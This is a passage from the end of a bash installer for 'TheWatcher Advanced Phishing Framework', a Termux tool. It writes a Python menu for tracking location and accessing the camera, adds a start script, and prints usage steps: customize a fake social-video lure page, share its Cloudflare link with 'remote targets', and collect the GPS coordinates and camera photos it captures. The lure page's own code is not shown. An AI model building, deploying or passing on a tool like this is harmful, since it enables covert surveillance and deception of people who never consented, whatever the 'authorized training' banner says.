        ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░░██▒██▓  ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒
        ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
          ░     ▒ ░▒░ ░ ░ ░  ░     ▒ ░ ░    ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
        ░       ░  ░░ ░   ░        ░   ░    ░   ▒    ░      ░         ░  ░░ ░   ░     ░░   ░ 
                ░  ░  ░   ░  ░       ░          ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     
                            ~EvilmaxSec | Tz~
"""+Colors.END)
    print(Colors.RED+Colors.BOLD+"╔══════════════════════════════════════════════════════════════╗"+Colors.END)
    print(Colors.RED+Colors.BOLD+"║         TheWatcher Advanced Phishing Framework               ║"+Colors.END)
    print(Colors.RED+Colors.BOLD+"╚══════════════════════════════════════════════════════════════╝"+Colors.END)
    print(Colors.GRAY+"┌────────────────────────────────────────────────────────────────────────┐")
    print("│  "+Colors.WHITE+"Author: "+Colors.RED+"EvilmaxSec"+Colors.GRAY+"                                                     │")
    print("│  "+Colors.WHITE+"GitHub: "+Colors.GRAY+"https://github.com/EvilmaxSec"+Colors.GRAY+"                                       │")
    print("│  "+Colors.RED+"⚠  AUTHORIZED TRAINING USE ONLY  ⚠"+Colors.GRAY+"                                    │")
    print("└────────────────────────────────────────────────────────────────────────┘"+Colors.END)
    print("")

def main():
    watcher=TheWatcher()
    while True:
        banner()
        print_menu("MAIN MENU",{"1":"📍 Track Location","2":"📸 Access Camera","3":"📊 View Data","4":"🚪 Exit"})
        choice=get_input("\nSelect","1")
        if choice=='1': watcher.location_menu()
        elif choice=='2': watcher.camera_menu()
        elif choice=='3': watcher.view_data()
        elif choice=='4': print_success("Goodbye!"); sys.exit(0)
        else: print_error("Invalid")

if __name__=="__main__": main()
EOF

chmod +x thewatcher.py

# Create start script
cat > start.sh << 'EOF'
#!/bin/bash
cd "$(dirname "$0")"
export PROOT_TMP_DIR="/data/data/com.termux/files/usr/tmp"
echo -e "\033[96m🚀 Starting TheWatcher...\033[0m"
python3 thewatcher.py
EOF
chmod +x start.sh

echo ""
echo -e "${GREEN}${BOLD}╔═══════════════════════════════════════════════════════════════╗${END}"
echo -e "${GREEN}${BOLD}║                    ✅ INSTALLATION COMPLETE!                    ║${END}"
echo -e "${GREEN}${BOLD}╚═══════════════════════════════════════════════════════════════╝${END}"
echo ""
echo -e "${CYAN}${BOLD}📖 HOW TO USE:${END}"
echo ""
echo -e "${YELLOW}1. START THEWATCHER:${END}"
echo -e "   ${WHITE}cd $INSTALL_DIR${END}"
echo -e "   ${WHITE}python3 thewatcher.py${END}"
echo -e "   ${WHITE}OR: ./start.sh${END}"
echo ""
echo -e "${YELLOW}2. SELECT MODULE:${END}"
echo -e "   ${WHITE}[1] Track Location - Get GPS coordinates${END}"
echo -e "   ${WHITE}[2] Access Camera - Capture photos${END}"
echo -e "   ${WHITE}[3] View Data - See captured information${END}"
echo -e "   ${WHITE}[4] Exit${END}"
echo ""
echo -e "${YELLOW}3. CUSTOMIZE YOUR TEMPLATE:${END}"
echo -e "   ${WHITE}• Username${END}"
echo -e "   ${WHITE}• Profile image (URL or local file)${END}"
echo -e "   ${WHITE}• Video (URL or local file)${END}"
echo -e "   ${WHITE}• Custom stats (views, likes, comments, shares)${END}"
echo ""
echo -e "${YELLOW}4. SHARE THE LINK:${END}"
echo -e "   ${WHITE}• Cloudflare URL - For remote targets${END}"
echo -e "   ${WHITE}• Local URL - For testing on same device${END}"
echo -e "   ${WHITE}• Network URL - For LAN targets${END}"
echo ""
echo -e "${YELLOW}5. CAPTURED DATA:${END}"
echo -e "   ${WHITE}• Location: data/location_*.json${END}"
echo -e "   ${WHITE}• Camera: data/camera_*.jpg${END}"
echo ""
echo -e "${RED}${BOLD}⚠️  AUTHORIZED TRAINING USE ONLY${END}"
echo ""
